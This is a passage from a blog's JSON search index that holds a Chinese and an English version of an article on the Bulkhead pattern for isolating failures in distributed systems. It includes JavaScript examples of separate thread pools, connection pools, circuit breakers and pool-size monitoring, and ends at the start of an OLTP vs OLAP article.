Tolerance","slug":"Fault-Tolerance","permalink":"https://neo01.com/tags/Fault-Tolerance/"}],"lang":"zh-CN"},{"title":"隔艙模式：在分散式系統中隔離故障","slug":"2020/03/Bulkhead-Pattern-zh-TW","date":"un33fin33","updated":"un55fin55","comments":true,"path":"/zh-TW/2020/03/Bulkhead-Pattern/","permalink":"https://neo01.com/zh-TW/2020/03/Bulkhead-Pattern/","excerpt":"探索隔艙模式如何透過隔離資源和限制故障影響範圍，防止分散式系統中的連鎖故障。","text":"想像一艘被隔艙分隔成多個水密艙室的船。如果船體破裂，只有一個艙室會進水，其他艙室保持乾燥，讓船隻保持漂浮。這個海事安全原則啟發了建構彈性分散式系統的關鍵模式：隔艙模式。 問題：連鎖故障 在分散式系統中，元件共享資源，如執行緒池、資料庫連線、記憶體和網路頻寬。當一個元件故障或變慢時，它可能會耗盡所有可用資源，造成骨牌效應，導致整個系統崩潰。 考慮以下情境： 執行緒池耗盡：緩慢的外部 API 消耗所有執行緒，阻塞其他操作 連線池耗盡：一個資料庫查詢鎖定所有連線，阻止其他服務存取資料庫 記憶體飽和：一個元件的記憶體洩漏導致整個應用程式崩潰 網路頻寬：大型檔案傳輸佔用其他網路操作的頻寬 ⚠️ 實際影響單一緩慢的微服務消耗所有可用執行緒，可能連鎖導致完全的系統中斷，影響數千名使用者和多個業務功能。 解決方案：隔離資源 隔艙模式透過將資源分割成隔離的池來解決這個問題。每個元件或服務獲得自己的專用資源，防止故障在系統中擴散。 關鍵原則： 分割資源成隔離的池（執行緒池、連線池等） 分配資源基於關鍵性和預期負載 包含故障在其指定的分區內 維持服務對未受影響的元件 graph TB subgraph \"沒有隔艙\" A1[服務 A] --> SP[共享池100 執行緒] B1[服務 B] --> SP C1[服務 C] --> SP SP -.->|故障擴散| X1[完全中斷] end subgraph \"使用隔艙\" A2[服務 A] --> PA[池 A40 執行緒] B2[服務 B] --> PB[池 B30 執行緒] C2[服務 C] --> PC[池 C30 執行緒] PB -.->|故障被包含| X2[服務 B 停止] PA --> OK1[服務 A 正常] PC --> OK2[服務 C 正常] end style X1 fill:#ff6b6b,stroke:#c92a2a style X2 fill:#ffd43b,stroke:#f59f00 style OK1 fill:#51cf66,stroke:#2f9e44 style OK2 fill:#51cf66,stroke:#2f9e44 運作方式：資源隔離 讓我們探索如何為不同的資源類型實作隔艙： 執行緒池隔離 分離的執行緒池防止一個緩慢的操作阻塞其他操作： &#x2F;&#x2F; 沒有隔艙 - 共享執行緒池 const sharedExecutor &#x3D; new ThreadPoolExecutor(100); app.get(&#39;&#x2F;api&#x2F;orders&#39;, async (req, res) &#x3D;&gt; &#123; await sharedExecutor.execute(() &#x3D;&gt; fetchOrders()); &#125;); app.get(&#39;&#x2F;api&#x2F;inventory&#39;, async (req, res) &#x3D;&gt; &#123; await sharedExecutor.execute(() &#x3D;&gt; fetchInventory()); &#125;); &#x2F;&#x2F; 問題：緩慢的 fetchOrders() 阻塞 fetchInventory() &#x2F;&#x2F; 使用隔艙 - 隔離的執行緒池 const orderExecutor &#x3D; new ThreadPoolExecutor(40); const inventoryExecutor &#x3D; new ThreadPoolExecutor(30); const paymentExecutor &#x3D; new ThreadPoolExecutor(30); app.get(&#39;&#x2F;api&#x2F;orders&#39;, async (req, res) &#x3D;&gt; &#123; await orderExecutor.execute(() &#x3D;&gt; fetchOrders()); &#125;); app.get(&#39;&#x2F;api&#x2F;inventory&#39;, async (req, res) &#x3D;&gt; &#123; await inventoryExecutor.execute(() &#x3D;&gt; fetchInventory()); &#125;); app.get(&#39;&#x2F;api&#x2F;payment&#39;, async (req, res) &#x3D;&gt; &#123; await paymentExecutor.execute(() &#x3D;&gt; processPayment()); &#125;); &#x2F;&#x2F; 好處：緩慢的訂單不會影響庫存或付款 連線池隔離 為不同服務分離資料庫連線池： &#x2F;&#x2F; 配置隔離的連線池 const orderDbPool &#x3D; createPool(&#123; host: &#39;db.example.com&#39;, database: &#39;orders&#39;, max: 20, &#x2F;&#x2F; 最多 20 個連線 min: 5 &#125;); const analyticsDbPool &#x3D; createPool(&#123; host: &#39;db.example.com&#39;, database: &#39;analytics&#39;, max: 10, &#x2F;&#x2F; 分析的獨立池 min: 2 &#125;); &#x2F;&#x2F; 繁重的分析查詢不會影響訂單處理 async function getOrderDetails(orderId) &#123; const conn &#x3D; await orderDbPool.getConnection(); try &#123; return await conn.query(&#39;SELECT * FROM orders WHERE id &#x3D; ?&#39;, [orderId]); &#125; finally &#123; conn.release(); &#125; &#125; async function runAnalytics() &#123; const conn &#x3D; await analyticsDbPool.getConnection(); try &#123; return await conn.query(&#39;SELECT &#x2F;* 複雜的分析查詢 *&#x2F;&#39;); &#125; finally &#123; conn.release(); &#125; &#125; 斷路器整合 結合隔艙與斷路器以增強彈性： const CircuitBreaker &#x3D; require(&#39;opossum&#39;); &#x2F;&#x2F; 為每個服務建立隔離的斷路器 const orderServiceBreaker &#x3D; new CircuitBreaker(callOrderService, &#123; timeout: 3000, errorThresholdPercentage: 50, resetTimeout: 30000 &#125;); const inventoryServiceBreaker &#x3D; new CircuitBreaker(callInventoryService, &#123; timeout: 3000, errorThresholdPercentage: 50, resetTimeout: 30000 &#125;); &#x2F;&#x2F; 每個服務有自己的故障處理 async function processOrder(order) &#123; try &#123; const orderResult &#x3D; await orderServiceBreaker.fire(order); const inventoryResult &#x3D; await inventoryServiceBreaker.fire(order.items); return &#123; orderResult, inventoryResult &#125;; &#125; catch (error) &#123; &#x2F;&#x2F; 優雅地處理故障 return &#123; error: error.message &#125;; &#125; &#125; 實作策略 1. 基於服務的分割 根據服務邊界分配資源： class BulkheadManager &#123; constructor() &#123; this.pools &#x3D; &#123; critical: new ThreadPool(50), &#x2F;&#x2F; 關鍵操作 standard: new ThreadPool(30), &#x2F;&#x2F; 標準操作 background: new ThreadPool(20) &#x2F;&#x2F; 背景任務 &#125;; &#125; async execute(priority, task) &#123; const pool &#x3D; this.pools[priority] || this.pools.standard; return pool.execute(task); &#125; &#125; const bulkhead &#x3D; new BulkheadManager(); &#x2F;&#x2F; 關鍵的面向使用者操作 app.post(&#39;&#x2F;api&#x2F;checkout&#39;, async (req, res) &#x3D;&gt; &#123; const result &#x3D; await bulkhead.execute(&#39;critical&#39;, () &#x3D;&gt; processCheckout(req.body) ); res.json(result); &#125;); &#x2F;&#x2F; 背景操作 app.post(&#39;&#x2F;api&#x2F;analytics&#39;, async (req, res) &#x3D;&gt; &#123; await bulkhead.execute(&#39;background&#39;, () &#x3D;&gt; logAnalytics(req.body) ); res.status(202).send(); &#125;); 2. 基於租戶的分割 在多租戶系統中為每個租戶隔離資源： class TenantBulkhead &#123; constructor() &#123; this.tenantPools &#x3D; new Map(); &#125; getPool(tenantId) &#123; if (!this.tenantPools.has(tenantId)) &#123; this.tenantPools.set(tenantId, new ThreadPool(10)); &#125; return this.tenantPools.get(tenantId); &#125; async execute(tenantId, task) &#123; const pool &#x3D; this.getPool(tenantId); return pool.execute(task); &#125; &#125; &#x2F;&#x2F; 租戶 A 的繁重負載不會影響租戶 B const tenantBulkhead &#x3D; new TenantBulkhead(); app.get(&#39;&#x2F;api&#x2F;data&#39;, async (req, res) &#x3D;&gt; &#123; const tenantId &#x3D; req.headers[&#39;x-tenant-id&#39;]; const result &#x3D; await tenantBulkhead.execute(tenantId, () &#x3D;&gt; fetchTenantData(tenantId) ); res.json(result); &#125;); 3. 基於負載的分割 分離高負載和低負載操作： const bulkheadConfig &#x3D; &#123; highThroughput: &#123; maxConcurrent: 100, queue: 1000 &#125;, lowThroughput: &#123; maxConcurrent: 20, queue: 100 &#125; &#125;; &#x2F;&#x2F; 高吞吐量端點 app.get(&#39;&#x2F;api&#x2F;search&#39;, rateLimiter(bulkheadConfig.highThroughput), async (req, res) &#x3D;&gt; &#123; &#x2F;&#x2F; 處理搜尋請求 &#125; ); &#x2F;&#x2F; 低吞吐量但資源密集 app.post(&#39;&#x2F;api&#x2F;reports&#39;, rateLimiter(bulkheadConfig.lowThroughput), async (req, res) &#x3D;&gt; &#123; &#x2F;&#x2F; 生成複雜報告 &#125; ); 何時使用隔艙模式 主要使用案例 ✅ 理想情境共享資源競爭：當多個服務競爭有限資源（如執行緒、連線或記憶體）時。 關鍵服務保護：當您需要保證高優先級服務的可用性，無論其他元件故障如何。 多租戶系統：當隔離租戶可防止一個租戶的負載影響其他租戶時。 次要使用案例 📋 額外好處效能隔離：將緩慢操作與快速操作分離，以維持整體系統回應性。 故障包含：將故障的影響範圍限制在特定分區。 資源最佳化：根據實際使用模式和優先級分配資源。 graph TD A[資源分析] --> B{共享資源？} B -->|是| C{關鍵服務？} B -->|否| D[監控使用] C -->|是| E[使用隔艙] C -->|否| F{多租戶？} F -->|是| E F -->|否| G{效能問題？} G -->|是| E G -->|否| D style E fill:#51cf66,stroke:#2f9e44 style D fill:#4dabf7,stroke:#1971c2 架構品質屬性 隔艙模式顯著影響系統品質： 彈性 隔艙透過以下方式增強彈性： 故障隔離：將故障包含在特定分區內 優雅降級：在故障期間維持部分功能 影響範圍限制：防止系統中的連鎖故障 可用性 可用性改進包括： 服務連續性：關鍵服務在其他故障時保持可用 減少停機時間：隔離的故障不會導致完全中斷 更快恢復：較小的故障域恢復更快 效能 效能優勢來自： 資源最佳化：專用資源防止競爭 可預測的延遲：隔離防止緩慢操作影響快速操作 更好的吞吐量：平行處理而不互相干擾 可擴展性 可擴展性優勢包括： 獨立擴展：根據需求為特定分區擴展資源 負載分配：在隔離的資源池之間分配負載 容量規劃：更容易為隔離元件規劃容量 權衡與考量 像任何模式一樣，隔艙引入了權衡： ⚠️ 潛在缺點資源開銷：維護多個池消耗更多總資源 複雜性：額外的配置和管理開銷 資源浪費：未充分利用的池代表浪費的容量 調整挑戰：確定最佳分區大小需要仔細分析 調整隔艙大小 確定每個分區的正確大小至關重要： &#x2F;&#x2F; 調整大小時考慮這些因素 const bulkheadSize &#x3D; &#123; &#x2F;&#x2F; 預期並發請求 expectedLoad: 100, &#x2F;&#x2F; 平均回應時間（毫秒） avgResponseTime: 200, &#x2F;&#x2F; 安全邊際（20%） safetyMargin: 1.2, &#x2F;&#x2F; 計算池大小 calculate() &#123; &#x2F;&#x2F; Little&#39;s Law: L &#x3D; λ × W &#x2F;&#x2F; L &#x3D; 並發請求 &#x2F;&#x2F; λ &#x3D; 到達率（請求&#x2F;秒） &#x2F;&#x2F; W &#x3D; 系統中的平均時間（秒） const arrivalRate &#x3D; this.expectedLoad &#x2F; 1; const timeInSystem &#x3D; this.avgResponseTime &#x2F; 1000; return Math.ceil(arrivalRate * timeInSystem * this.safetyMargin); &#125; &#125;; console.log(&#96;建議的池大小：$&#123;bulkheadSize.calculate()&#125;&#96;); 監控與可觀察性 有效的隔艙實作需要監控： class MonitoredBulkhead &#123; constructor(name, maxConcurrent) &#123; this.name &#x3D; name; this.maxConcurrent &#x3D; maxConcurrent; this.active &#x3D; 0; this.rejected &#x3D; 0; this.completed &#x3D; 0; &#125; async execute(task) &#123; if (this.active &gt;&#x3D; this.maxConcurrent) &#123; this.rejected++; throw new Error(&#96;隔艙 $&#123;this.name&#125; 已達容量&#96;); &#125; this.active++; const startTime &#x3D; Date.now(); try &#123; const result &#x3D; await task(); this.completed++; return result; &#125; finally &#123; this.active--; const duration &#x3D; Date.now() - startTime; &#x2F;&#x2F; 發送指標 metrics.gauge(&#96;bulkhead.$&#123;this.name&#125;.active&#96;, this.active); metrics.counter(&#96;bulkhead.$&#123;this.name&#125;.completed&#96;, 1); metrics.histogram(&#96;bulkhead.$&#123;this.name&#125;.duration&#96;, duration); &#125; &#125; getMetrics() &#123; return &#123; name: this.name, active: this.active, utilization: (this.active &#x2F; this.maxConcurrent) * 100, rejected: this.rejected, completed: this.completed &#125;; &#125; &#125; 要監控的關鍵指標： 使用率：使用中的池容量百分比 拒絕率：由於容量而拒絕請求的頻率 佇列深度：等待中的請求數量 回應時間：每個分區內的延遲 錯誤率：每個隔艙內的故障 實際實作模式 模式 1：微服務架構 每個微服務都有隔離的資源： &#x2F;&#x2F; 服務 A - 訂單服務 const orderService &#x3D; &#123; threadPool: new ThreadPool(50), dbPool: createPool(&#123; max: 20 &#125;), cachePool: createPool(&#123; max: 10 &#125;) &#125;; &#x2F;&#x2F; 服務 B - 庫存服務 const inventoryService &#x3D; &#123; threadPool: new ThreadPool(30), dbPool: createPool(&#123; max: 15 &#125;), cachePool: createPool(&#123; max: 5 &#125;) &#125;; &#x2F;&#x2F; 服務之間完全隔離 模式 2：具有隔艙的 API 閘道 API 閘道為後端服務實作隔艙： const gateway &#x3D; &#123; routes: &#123; &#39;&#x2F;api&#x2F;orders&#39;: &#123; bulkhead: new Bulkhead(40), backend: &#39;http:&#x2F;&#x2F;orders-service&#39; &#125;, &#39;&#x2F;api&#x2F;inventory&#39;: &#123; bulkhead: new Bulkhead(30), backend: &#39;http:&#x2F;&#x2F;inventory-service&#39; &#125;, &#39;&#x2F;api&#x2F;analytics&#39;: &#123; bulkhead: new Bulkhead(10), backend: &#39;http:&#x2F;&#x2F;analytics-service&#39; &#125; &#125; &#125;; app.use(async (req, res) &#x3D;&gt; &#123; const route &#x3D; gateway.routes[req.path]; if (!route) return res.status(404).send(); try &#123; await route.bulkhead.execute(async () &#x3D;&gt; &#123; const response &#x3D; await fetch(route.backend + req.path); res.json(await response.json()); &#125;); &#125; catch (error) &#123; res.status(503).json(&#123; error: &#39;服務不可用&#39; &#125;); &#125; &#125;); 結論 隔艙模式對於建構彈性分散式系統至關重要。透過隔離資源和包含故障，它使系統能夠： 防止連鎖故障 在中斷期間維持部分功能 保護關鍵服務 最佳化資源利用 雖然它引入了額外的複雜性和資源開銷，但改進的彈性和可用性使其對生產系統來說非常寶貴。當共享資源造成競爭或當您需要保證關鍵服務的可用性時，請實作隔艙。 相關模式 斷路器：透過防止呼叫故障服務來補充隔艙 重試模式：與隔艙一起處理暫時性故障 節流：控制請求速率以防止資源耗盡 基於佇列的負載平衡：平滑可能壓垮隔艙的負載峰值 參考資料 Microsoft Azure Architecture Patterns: Bulkhead Release It! Design and Deploy Production-Ready Software Netflix Hystrix: Bulkhead Pattern","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/tags/Architecture/"},{"name":"Design Patterns","slug":"Design-Patterns","permalink":"https://neo01.com/tags/Design-Patterns/"},{"name":"Resilience","slug":"Resilience","permalink":"https://neo01.com/tags/Resilience/"},{"name":"Fault Tolerance","slug":"Fault-Tolerance","permalink":"https://neo01.com/tags/Fault-Tolerance/"}],"lang":"zh-TW"},{"title":"The Bulkhead Pattern: Isolating Failures in Distributed Systems","slug":"2020/03/Bulkhead-Pattern","date":"un00fin00","updated":"un22fin22","comments":true,"path":"2020/03/Bulkhead-Pattern/","permalink":"https://neo01.com/2020/03/Bulkhead-Pattern/","excerpt":"Discover how the Bulkhead pattern prevents cascading failures by isolating resources and limiting the blast radius when components fail in distributed systems.","text":"Imagine a ship divided into watertight compartments by bulkheads. If the hull is breached, only one compartment floods while the others remain dry, keeping the ship afloat. This maritime safety principle inspired a critical pattern for building resilient distributed systems: the Bulkhead pattern. The Problem: Cascading Failures In distributed systems, components share resources like thread pools, database connections, memory, and network bandwidth. When one component fails or becomes slow, it can consume all available resources, causing a domino effect that brings down the entire system. Consider these scenarios: Thread Pool Exhaustion: A slow external API consumes all threads, blocking other operations Connection Pool Depletion: One database query locks all connections, preventing other services from accessing the database Memory Saturation: A memory leak in one component crashes the entire application Network Bandwidth: A large file transfer starves other network operations ⚠️ Real-World ImpactA single slow microservice consuming all available threads can cascade into a complete system outage, affecting thousands of users and multiple business functions simultaneously. The Solution: Isolate Resources The Bulkhead pattern solves this problem by partitioning resources into isolated pools. Each component or service gets its own dedicated resources, preventing failures from spreading across the system. Key principles: Partition resources into isolated pools (thread pools, connection pools, etc.) Allocate resources based on criticality and expected load Contain failures within their designated partition Maintain service for unaffected components graph TB subgraph \"Without Bulkhead\" A1[Service A] --> SP[Shared Pool100 threads] B1[Service B] --> SP C1[Service C] --> SP SP -.->|Failure spreads| X1[Complete Outage] end subgraph \"With Bulkhead\" A2[Service A] --> PA[Pool A40 threads] B2[Service B] --> PB[Pool B30 threads] C2[Service C] --> PC[Pool C30 threads] PB -.->|Failure contained| X2[Service B Down] PA --> OK1[Service A OK] PC --> OK2[Service C OK] end style X1 fill:#ff6b6b,stroke:#c92a2a style X2 fill:#ffd43b,stroke:#f59f00 style OK1 fill:#51cf66,stroke:#2f9e44 style OK2 fill:#51cf66,stroke:#2f9e44 How It Works: Resource Isolation Let’s explore how to implement bulkheads for different resource types: Thread Pool Isolation Separate thread pools prevent one slow operation from blocking others: &#x2F;&#x2F; Without Bulkhead - shared thread pool const sharedExecutor &#x3D; new ThreadPoolExecutor(100); app.get(&#39;&#x2F;api&#x2F;orders&#39;, async (req, res) &#x3D;&gt; &#123; await sharedExecutor.execute(() &#x3D;&gt; fetchOrders()); &#125;); app.get(&#39;&#x2F;api&#x2F;inventory&#39;, async (req, res) &#x3D;&gt; &#123; await sharedExecutor.execute(() &#x3D;&gt; fetchInventory()); &#125;); &#x2F;&#x2F; Problem: Slow fetchOrders() blocks fetchInventory() &#x2F;&#x2F; With Bulkhead - isolated thread pools const orderExecutor &#x3D; new ThreadPoolExecutor(40); const inventoryExecutor &#x3D; new ThreadPoolExecutor(30); const paymentExecutor &#x3D; new ThreadPoolExecutor(30); app.get(&#39;&#x2F;api&#x2F;orders&#39;, async (req, res) &#x3D;&gt; &#123; await orderExecutor.execute(() &#x3D;&gt; fetchOrders()); &#125;); app.get(&#39;&#x2F;api&#x2F;inventory&#39;, async (req, res) &#x3D;&gt; &#123; await inventoryExecutor.execute(() &#x3D;&gt; fetchInventory()); &#125;); app.get(&#39;&#x2F;api&#x2F;payment&#39;, async (req, res) &#x3D;&gt; &#123; await paymentExecutor.execute(() &#x3D;&gt; processPayment()); &#125;); &#x2F;&#x2F; Benefit: Slow orders don&#39;t affect inventory or payment Connection Pool Isolation Separate database connection pools for different services: &#x2F;&#x2F; Configure isolated connection pools const orderDbPool &#x3D; createPool(&#123; host: &#39;db.example.com&#39;, database: &#39;orders&#39;, max: 20, &#x2F;&#x2F; Maximum 20 connections min: 5 &#125;); const analyticsDbPool &#x3D; createPool(&#123; host: &#39;db.example.com&#39;, database: &#39;analytics&#39;, max: 10, &#x2F;&#x2F; Separate pool for analytics min: 2 &#125;); &#x2F;&#x2F; Heavy analytics queries won&#39;t starve order processing async function getOrderDetails(orderId) &#123; const conn &#x3D; await orderDbPool.getConnection(); try &#123; return await conn.query(&#39;SELECT * FROM orders WHERE id &#x3D; ?&#39;, [orderId]); &#125; finally &#123; conn.release(); &#125; &#125; async function runAnalytics() &#123; const conn &#x3D; await analyticsDbPool.getConnection(); try &#123; return await conn.query(&#39;SELECT &#x2F;* complex analytics query *&#x2F;&#39;); &#125; finally &#123; conn.release(); &#125; &#125; Circuit Breaker Integration Combine bulkheads with circuit breakers for enhanced resilience: const CircuitBreaker &#x3D; require(&#39;opossum&#39;); &#x2F;&#x2F; Create isolated circuit breakers for each service const orderServiceBreaker &#x3D; new CircuitBreaker(callOrderService, &#123; timeout: 3000, errorThresholdPercentage: 50, resetTimeout: 30000 &#125;); const inventoryServiceBreaker &#x3D; new CircuitBreaker(callInventoryService, &#123; timeout: 3000, errorThresholdPercentage: 50, resetTimeout: 30000 &#125;); &#x2F;&#x2F; Each service has its own failure handling async function processOrder(order) &#123; try &#123; const orderResult &#x3D; await orderServiceBreaker.fire(order); const inventoryResult &#x3D; await inventoryServiceBreaker.fire(order.items); return &#123; orderResult, inventoryResult &#125;; &#125; catch (error) &#123; &#x2F;&#x2F; Handle failure gracefully return &#123; error: error.message &#125;; &#125; &#125; Implementation Strategies 1. Service-Based Partitioning Allocate resources based on service boundaries: class BulkheadManager &#123; constructor() &#123; this.pools &#x3D; &#123; critical: new ThreadPool(50), &#x2F;&#x2F; Critical operations standard: new ThreadPool(30), &#x2F;&#x2F; Standard operations background: new ThreadPool(20) &#x2F;&#x2F; Background tasks &#125;; &#125; async execute(priority, task) &#123; const pool &#x3D; this.pools[priority] || this.pools.standard; return pool.execute(task); &#125; &#125; const bulkhead &#x3D; new BulkheadManager(); &#x2F;&#x2F; Critical user-facing operations app.post(&#39;&#x2F;api&#x2F;checkout&#39;, async (req, res) &#x3D;&gt; &#123; const result &#x3D; await bulkhead.execute(&#39;critical&#39;, () &#x3D;&gt; processCheckout(req.body) ); res.json(result); &#125;); &#x2F;&#x2F; Background operations app.post(&#39;&#x2F;api&#x2F;analytics&#39;, async (req, res) &#x3D;&gt; &#123; await bulkhead.execute(&#39;background&#39;, () &#x3D;&gt; logAnalytics(req.body) ); res.status(202).send(); &#125;); 2. Tenant-Based Partitioning Isolate resources per tenant in multi-tenant systems: class TenantBulkhead &#123; constructor() &#123; this.tenantPools &#x3D; new Map(); &#125; getPool(tenantId) &#123; if (!this.tenantPools.has(tenantId)) &#123; this.tenantPools.set(tenantId, new ThreadPool(10)); &#125; return this.tenantPools.get(tenantId); &#125; async execute(tenantId, task) &#123; const pool &#x3D; this.getPool(tenantId); return pool.execute(task); &#125; &#125; &#x2F;&#x2F; Tenant A&#39;s heavy load won&#39;t affect Tenant B const tenantBulkhead &#x3D; new TenantBulkhead(); app.get(&#39;&#x2F;api&#x2F;data&#39;, async (req, res) &#x3D;&gt; &#123; const tenantId &#x3D; req.headers[&#39;x-tenant-id&#39;]; const result &#x3D; await tenantBulkhead.execute(tenantId, () &#x3D;&gt; fetchTenantData(tenantId) ); res.json(result); &#125;); 3. Load-Based Partitioning Separate high-load and low-load operations: const bulkheadConfig &#x3D; &#123; highThroughput: &#123; maxConcurrent: 100, queue: 1000 &#125;, lowThroughput: &#123; maxConcurrent: 20, queue: 100 &#125; &#125;; &#x2F;&#x2F; High-throughput endpoint app.get(&#39;&#x2F;api&#x2F;search&#39;, rateLimiter(bulkheadConfig.highThroughput), async (req, res) &#x3D;&gt; &#123; &#x2F;&#x2F; Handle search requests &#125; ); &#x2F;&#x2F; Low-throughput but resource-intensive app.post(&#39;&#x2F;api&#x2F;reports&#39;, rateLimiter(bulkheadConfig.lowThroughput), async (req, res) &#x3D;&gt; &#123; &#x2F;&#x2F; Generate complex reports &#125; ); When to Use the Bulkhead Pattern Primary Use Cases ✅ Ideal ScenariosShared Resource Contention: When multiple services compete for limited resources like threads, connections, or memory. Critical Service Protection: When you need to guarantee availability for high-priority services regardless of other component failures. Multi-Tenant Systems: When isolating tenants prevents one tenant's load from affecting others. Secondary Use Cases 📋 Additional BenefitsPerformance Isolation: Separate slow operations from fast ones to maintain overall system responsiveness. Failure Containment: Limit the blast radius of failures to specific partitions. Resource Optimization: Allocate resources based on actual usage patterns and priorities. graph TD A[Resource Analysis] --> B{Shared Resources?} B -->|Yes| C{Critical Services?} B -->|No| D[Monitor Usage] C -->|Yes| E[Use Bulkhead] C -->|No| F{Multi-Tenant?} F -->|Yes| E F -->|No| G{Performance Issues?} G -->|Yes| E G -->|No| D style E fill:#51cf66,stroke:#2f9e44 style D fill:#4dabf7,stroke:#1971c2 Architecture Quality Attributes The Bulkhead pattern significantly impacts system quality: Resilience Bulkheads enhance resilience by: Failure Isolation: Containing failures within specific partitions Graceful Degradation: Maintaining partial functionality during failures Blast Radius Limitation: Preventing cascading failures across the system Availability Availability improvements include: Service Continuity: Critical services remain available despite other failures Reduced Downtime: Isolated failures don’t cause complete outages Faster Recovery: Smaller failure domains recover more quickly Performance Performance benefits arise from: Resource Optimization: Dedicated resources prevent contention Predictable Latency: Isolation prevents slow operations from affecting fast ones Better Throughput: Parallel processing without interference Scalability Scalability advantages include: Independent Scaling: Scale resources for specific partitions based on demand Load Distribution: Distribute load across isolated resource pools Capacity Planning: Easier to plan capacity for isolated components Trade-offs and Considerations Like any pattern, bulkheads introduce trade-offs: ⚠️ Potential DrawbacksResource Overhead: Maintaining multiple pools consumes more total resources Complexity: Additional configuration and management overhead Resource Waste: Underutilized pools represent wasted capacity Tuning Challenges: Determining optimal partition sizes requires careful analysis Sizing Bulkheads Determining the right size for each partition is critical: &#x2F;&#x2F; Consider these factors when sizing const bulkheadSize &#x3D; &#123; &#x2F;&#x2F; Expected concurrent requests expectedLoad: 100, &#x2F;&#x2F; Average response time (ms) avgResponseTime: 200, &#x2F;&#x2F; Safety margin (20%) safetyMargin: 1.2, &#x2F;&#x2F; Calculate pool size calculate() &#123; &#x2F;&#x2F; Little&#39;s Law: L &#x3D; λ × W &#x2F;&#x2F; L &#x3D; concurrent requests &#x2F;&#x2F; λ &#x3D; arrival rate (requests&#x2F;sec) &#x2F;&#x2F; W &#x3D; average time in system (sec) const arrivalRate &#x3D; this.expectedLoad &#x2F; 1; const timeInSystem &#x3D; this.avgResponseTime &#x2F; 1000; return Math.ceil(arrivalRate * timeInSystem * this.safetyMargin); &#125; &#125;; console.log(&#96;Recommended pool size: $&#123;bulkheadSize.calculate()&#125;&#96;); Monitoring and Observability Effective bulkhead implementation requires monitoring: class MonitoredBulkhead &#123; constructor(name, maxConcurrent) &#123; this.name &#x3D; name; this.maxConcurrent &#x3D; maxConcurrent; this.active &#x3D; 0; this.rejected &#x3D; 0; this.completed &#x3D; 0; &#125; async execute(task) &#123; if (this.active &gt;&#x3D; this.maxConcurrent) &#123; this.rejected++; throw new Error(&#96;Bulkhead $&#123;this.name&#125; at capacity&#96;); &#125; this.active++; const startTime &#x3D; Date.now(); try &#123; const result &#x3D; await task(); this.completed++; return result; &#125; finally &#123; this.active--; const duration &#x3D; Date.now() - startTime; &#x2F;&#x2F; Emit metrics metrics.gauge(&#96;bulkhead.$&#123;this.name&#125;.active&#96;, this.active); metrics.counter(&#96;bulkhead.$&#123;this.name&#125;.completed&#96;, 1); metrics.histogram(&#96;bulkhead.$&#123;this.name&#125;.duration&#96;, duration); &#125; &#125; getMetrics() &#123; return &#123; name: this.name, active: this.active, utilization: (this.active &#x2F; this.maxConcurrent) * 100, rejected: this.rejected, completed: this.completed &#125;; &#125; &#125; Key metrics to monitor: Utilization: Percentage of pool capacity in use Rejection Rate: How often requests are rejected due to capacity Queue Depth: Number of waiting requests Response Time: Latency within each partition Error Rate: Failures within each bulkhead Real-World Implementation Patterns Pattern 1: Microservices Architecture Each microservice has isolated resources: &#x2F;&#x2F; Service A - Order Service const orderService &#x3D; &#123; threadPool: new ThreadPool(50), dbPool: createPool(&#123; max: 20 &#125;), cachePool: createPool(&#123; max: 10 &#125;) &#125;; &#x2F;&#x2F; Service B - Inventory Service const inventoryService &#x3D; &#123; threadPool: new ThreadPool(30), dbPool: createPool(&#123; max: 15 &#125;), cachePool: createPool(&#123; max: 5 &#125;) &#125;; &#x2F;&#x2F; Complete isolation between services Pattern 2: API Gateway with Bulkheads API gateway implements bulkheads for backend services: const gateway &#x3D; &#123; routes: &#123; &#39;&#x2F;api&#x2F;orders&#39;: &#123; bulkhead: new Bulkhead(40), backend: &#39;http:&#x2F;&#x2F;orders-service&#39; &#125;, &#39;&#x2F;api&#x2F;inventory&#39;: &#123; bulkhead: new Bulkhead(30), backend: &#39;http:&#x2F;&#x2F;inventory-service&#39; &#125;, &#39;&#x2F;api&#x2F;analytics&#39;: &#123; bulkhead: new Bulkhead(10), backend: &#39;http:&#x2F;&#x2F;analytics-service&#39; &#125; &#125; &#125;; app.use(async (req, res) &#x3D;&gt; &#123; const route &#x3D; gateway.routes[req.path]; if (!route) return res.status(404).send(); try &#123; await route.bulkhead.execute(async () &#x3D;&gt; &#123; const response &#x3D; await fetch(route.backend + req.path); res.json(await response.json()); &#125;); &#125; catch (error) &#123; res.status(503).json(&#123; error: &#39;Service unavailable&#39; &#125;); &#125; &#125;); Conclusion The Bulkhead pattern is essential for building resilient distributed systems. By isolating resources and containing failures, it enables systems to: Prevent cascading failures Maintain partial functionality during outages Protect critical services Optimize resource utilization While it introduces additional complexity and resource overhead, the benefits of improved resilience and availability make it invaluable for production systems. Implement bulkheads when shared resources create contention or when you need to guarantee availability for critical services. Related Patterns Circuit Breaker: Complements bulkheads by preventing calls to failing services Retry Pattern: Works with bulkheads to handle transient failures Throttling: Controls request rates to prevent resource exhaustion Queue-Based Load Leveling: Smooths load spikes that could overwhelm bulkheads References Microsoft Azure Architecture Patterns: Bulkhead Release It! Design and Deploy Production-Ready Software Netflix Hystrix: Bulkhead Pattern","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/tags/Architecture/"},{"name":"Design Patterns","slug":"Design-Patterns","permalink":"https://neo01.com/tags/Design-Patterns/"},{"name":"Resilience","slug":"Resilience","permalink":"https://neo01.com/tags/Resilience/"},{"name":"Fault Tolerance","slug":"Fault-Tolerance","permalink":"https://neo01.com/tags/Fault-Tolerance/"}]},{"title":"OLTP vs OLAP：理解交易型與分析型資料庫","slug":"2020/02/OLTP-vs-OLAP-zh-TW","date":"un55fin55","updated":"un55fin55","comments":true,"path":"/zh-TW/2020/02/OLTP-vs-OLAP/","permalink":"https://neo01.com/zh-TW/2020/02/OLTP-vs-OLAP/","excerpt":"探索 OLTP 與 OLAP 系統的根本差異。了解何時使用交易型資料庫處理日常營運，以及何時使用分析型資料庫進行商業智慧分析。","text":"想像兩種不同類型的商店。第一種是繁忙的便利商店，顧客快速拿取商品、付款、離開——每小時數百筆小型快速交易。第二種是倉庫，分析師研究購買模式、庫存趨勢和季節性需求——較少的操作，但每次都檢查大量資料。這代表了資料庫系統的兩種基本方法：OLTP 和 OLAP。 資料處理的兩個世界 現代企業需要資料庫來滿足兩種不同的目的： OLTP (Online Transaction 